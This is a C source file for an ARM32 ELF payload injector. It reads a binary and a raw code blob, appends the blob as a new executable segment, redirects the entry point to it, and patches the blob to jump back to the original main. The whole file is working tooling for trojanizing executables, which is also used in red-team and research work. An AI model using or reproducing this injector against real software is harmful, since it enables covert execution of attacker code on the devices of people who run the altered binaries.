/*
 * Copyright (C) 2026 Ivan Gaydardzhiev
 * Licensed under the GPL-3.0-only
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <elf.h>
#include <errno.h>
#include <limits.h>
#include <stdint.h>

static uint64_t align_up(uint64_t value, uint64_t alignment) {
	if (alignment <= 1) return value;
	uint64_t remainder = value % alignment;
	if (remainder == 0) return value;
	return value + (alignment - remainder);
}

static void bail(const char *message) {
	if (errno) perror(message);
	else fprintf(stderr, "%s\n", message);
	exit(1);
}

static unsigned char *ref(const char *path, size_t *out_size) {
	FILE *f = fopen(path, "rb");
	if (!f) bail("failed to open input");
	if (fseek(f, 0, SEEK_END) != 0) bail("seek input");
	long signed_size = ftell(f);
	if (signed_size < 0) bail("ftell");
	size_t size = (size_t)signed_size;
	if (fseek(f, 0, SEEK_SET) != 0) bail("rewind input");
	unsigned char *buffer = malloc(size);
	if (!buffer) bail("malloc input");
	if (fread(buffer, 1, size, f) != size) bail("read input");
	fclose(f);
	*out_size = size;
	return buffer;
}

/* search the ELF32 symbol table for a named symbol, returns the symbol's st_value (virtual address), or 0 if not found */
static uint32_t find_symbol(unsigned char *input, size_t file_size, const char *name) {
	Elf32_Ehdr *ehdr = (Elf32_Ehdr *)input;
	if (ehdr->e_shoff == 0 || ehdr->e_shnum == 0) {
		fprintf(stderr, "WARNING: no section headers, cannot search symbols\n");
		return 0;
	}
	if (ehdr->e_shoff + (size_t)ehdr->e_shnum * ehdr->e_shentsize > file_size) {
		fprintf(stderr, "WARNING: section headers truncated\n");
		return 0;
	}
	Elf32_Shdr *shdrs = (Elf32_Shdr *)(input + ehdr->e_shoff);
	for (int i = 0; i < ehdr->e_shnum; i++) {
		if (shdrs[i].sh_type != SHT_SYMTAB && shdrs[i].sh_type != SHT_DYNSYM)
			continue;
		uint32_t link = shdrs[i].sh_link;
		if (link >= ehdr->e_shnum)
			continue;
		/* bounds check symbol table */
		if (shdrs[i].sh_offset + shdrs[i].sh_size > file_size)
			continue;
		/* bounds check string table */
		if (shdrs[link].sh_offset + shdrs[link].sh_size > file_size)
			continue;
		Elf32_Sym *syms  = (Elf32_Sym *)(input + shdrs[i].sh_offset);
		size_t nsyms = shdrs[i].sh_size / sizeof(Elf32_Sym);
		char *strtab = (char *)(input + shdrs[link].sh_offset);
		size_t strsz  = shdrs[link].sh_size;
		for (size_t j = 0; j < nsyms; j++) {
			uint32_t noff = syms[j].st_name;
			if (noff >= strsz)
				continue;
			if (strcmp(strtab + noff, name) == 0) {
				printf("DEBUG: found symbol '%s' at 0x%08x\n", name, syms[j].st_value);
				return syms[j].st_value;
			}
		}
	}
	return 0;
}

int main(int argc, char **argv) {
	if (argc != 4) {
		fprintf(stderr, "usage: %s <in.elf> <out.elf> <payload.bin>\n", argv[0]);
		return 1;
	}
	const char *input_path   = argv[1];
	const char *output_path  = argv[2];
	const char *payload_path = argv[3];
	size_t file_size = 0;
	unsigned char *input = ref(input_path, &file_size);
	if (file_size < sizeof(Elf32_Ehdr)) {
		free(input);
		bail("input too small to be ELF32");
	}
	Elf32_Ehdr *ehdr = (Elf32_Ehdr *)input;
	if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0) {
		free(input);
		bail("input is not an ELF file");
	}
	if (ehdr->e_ident[EI_CLASS] != ELFCLASS32) {
		free(input);
		bail("not 32-bit ELF");
	}
	if (ehdr->e_machine != EM_ARM) {
		free(input);
		bail("must be ARM ELF");
	}
	if (ehdr->e_phoff == 0 || ehdr->e_phnum == 0) {
		free(input);
		bail("ELF missing program headers");
	}
	if (ehdr->e_phoff + ehdr->e_phentsize * ehdr->e_phnum > file_size) {
		free(input);
		bail("program headers truncated");
	}
	Elf32_Phdr *phdrs = (Elf32_Phdr *)(input + ehdr->e_phoff);
	uint64_t max_file_end = 0;
	uint64_t max_vaddr_end = 0;
	uint64_t max_align = 0x1000;
	for (int i = 0; i < ehdr->e_phnum; ++i) {
		Elf32_Phdr *ph = &phdrs[i];
		if (ph->p_type != PT_LOAD)
			continue;
		uint64_t file_end  = ph->p_offset + ph->p_filesz;
		uint64_t vaddr_end = ph->p_vaddr  + ph->p_memsz;
		if (file_end > file_size) {
			free(input);
			bail("segment extends beyond end of file");
		}
		if (file_end  > max_file_end)  max_file_end  = file_end;
		if (vaddr_end > max_vaddr_end) max_vaddr_end = vaddr_end;
		if (ph->p_align > max_align)   max_align     = ph->p_align;
	}
	if (max_file_end == 0 || max_vaddr_end == 0) {
		free(input);
		bail("no loadable segments in ELF");
	}
	/*
	 * the payload calls main(argc, argv, envp) directly, bypassing _start entirely, because _start has already consumed the kernel stack and cannot be safely reentered...
	 * we resolve main() from the symbol table; bail if not found (stripped)...
	 */
	uint32_t return_target = find_symbol(input, file_size, "main");
	if (return_target == 0) {
		free(input);
		bail("'main' symbol not found - is the binary stripped? " "recompile without -s or use objcopy --strip-debug only");
	}
	printf("DEBUG: return_target (main)=0x%08x\n", return_target);
	/* load payload */
	size_t payload_size = 0;
	unsigned char *payload = ref(payload_path, &payload_size);
	printf("DEBUG: payload_size=%zu\n", payload_size);
	if (payload_size < 32 || payload_size > 1024*1024) {
		free(payload);
		free(input);
		bail("payload size invalid (32B-1MB required)");
	}
	/* locate the infinite loop stub: `b .` == fe ff ff ea (ARM LE) */
	size_t stub_offset = 0;
	bool   stub_found  = false;
	for (size_t i = 0; i + 4 <= payload_size; i++) {
		if (payload[i]   == 0xfe && payload[i+1] == 0xff &&
		    payload[i+2] == 0xff && payload[i+3] == 0xea) {
			stub_offset = i;
			stub_found  = true;
			break;
		}
	}
	if (!stub_found) {
		printf("payload dump:\n");
		for (size_t j = 0; j < payload_size; j++) {
			printf("%02x ", payload[j]);
			if ((j + 1) % 16 == 0) printf("\n");
		}
		printf("\n");
		free(payload);
		free(input);
		bail("ARM payload missing jmp stub (fe ff ff ea)");
	}
	printf("DEBUG: found stub at offset 0x%zx\n", stub_offset);
	/* addresses for injected segment */
	uint64_t payload_vaddr = align_up(max_vaddr_end, max_align);
	uint64_t base_file_extent = file_size > max_file_end ? file_size : max_file_end;
	uint64_t payload_offset = align_up(base_file_extent, max_align);
	uint64_t stub_addr = payload_vaddr + stub_offset;
	printf("DEBUG: return_target=0x%08x, stub_addr=0x%08lx\n",return_target, (unsigned long)stub_addr);
	/* ARM branch encoding: target = (PC + 8) + (offset_words * 4) => offset_words = (target - (stub_addr + 8)) / 4 */
	int32_t offset_bytes = (int32_t)return_target - (int32_t)(stub_addr + 8);
	int32_t offset_words = offset_bytes / 4;
	printf("DEBUG: offset_bytes=0x%x, offset_words=0x%x\n",offset_bytes, offset_words);
	if (offset_words < -8388608 || offset_words > 8388607) {
		free(payload);
		free(input);
		bail("branch target out of +/-32MB range");
	}
	uint32_t branch_instr = 0xea000000 | ((uint32_t)offset_words & 0x00ffffff);
	printf("DEBUG: branch_instr=0x%08x\n", branch_instr);
	memcpy(payload + stub_offset, &branch_instr, 4);
	/* build output file */
	uint64_t payload_size_u = (uint64_t)payload_size;
	uint64_t payload_file_end = payload_offset + payload_size_u;
	size_t phentsize = sizeof(Elf32_Phdr);
	uint64_t new_phoff = align_up(payload_file_end, phentsize);
	uint16_t new_phnum = ehdr->e_phnum + 1;
	size_t new_phdr_table_size = phentsize * new_phnum;
	uint64_t final_file_size_u = new_phoff + new_phdr_table_size;
	if (final_file_size_u > SIZE_MAX) {
		free(payload);
		free(input);
		bail("final file too large");
	}
	size_t final_file_size = (size_t)final_file_size_u;
	unsigned char *output = calloc(final_file_size, 1);
	if (!output) {
		free(payload);
		free(input);
		bail("calloc output");
	}
	memcpy(output, input, file_size);
	memcpy(output + payload_offset, payload, payload_size);
	Elf32_Ehdr *out_ehdr = (Elf32_Ehdr *)output;
	*out_ehdr = *ehdr;
	out_ehdr->e_flags |= EF_ARM_EABI_VER5;
	out_ehdr->e_entry = (Elf32_Addr)payload_vaddr;   /* new entrypoint = payload */
	out_ehdr->e_phoff = (Elf32_Off)new_phoff;
	out_ehdr->e_phnum = new_phnum;
	Elf32_Phdr *out_phdrs = (Elf32_Phdr *)(output + new_phoff);
	memcpy(out_phdrs, phdrs, ehdr->e_phnum * phentsize);
	Elf32_Phdr *payload_ph = &out_phdrs[ehdr->e_phnum];
	memset(payload_ph, 0, sizeof(*payload_ph));
	payload_ph->p_type = PT_LOAD;
	payload_ph->p_flags = PF_R | PF_X;
	payload_ph->p_offset = (Elf32_Off)payload_offset;
	payload_ph->p_vaddr = (Elf32_Addr)payload_vaddr;
	payload_ph->p_paddr = (Elf32_Addr)payload_vaddr;
	payload_ph->p_filesz = (Elf32_Word)payload_size;
	payload_ph->p_memsz = (Elf32_Word)payload_size;
	payload_ph->p_align = (Elf32_Word)max_align;
	FILE *fout = fopen(output_path, "wb");
	if (!fout) {
		free(output);
		free(payload);
		free(input);
		bail("failed to open output");
	}
	if (fwrite(output, 1, final_file_size, fout) != final_file_size) {
		fclose(fout);
		free(output);
		free(payload);
		free(input);
		bail("write output");
	}
	fclose(fout);
	free(output);
	free(payload);
	free(input);
	printf("ARM32 payload injected at vaddr=0x%lx file_offset=0x%lx size=%zuB\n",
	       (unsigned long)payload_vaddr,
	       (unsigned long)payload_offset,
	       payload_size);
	printf("entry:  0x%x (original _start) -> 0x%lx (payload)\n",
	       ehdr->e_entry, (unsigned long)payload_vaddr);
	printf("return: payload branches back to 0x%08x (_start, registers restored)\n",
	       return_target);
	return 0;
}
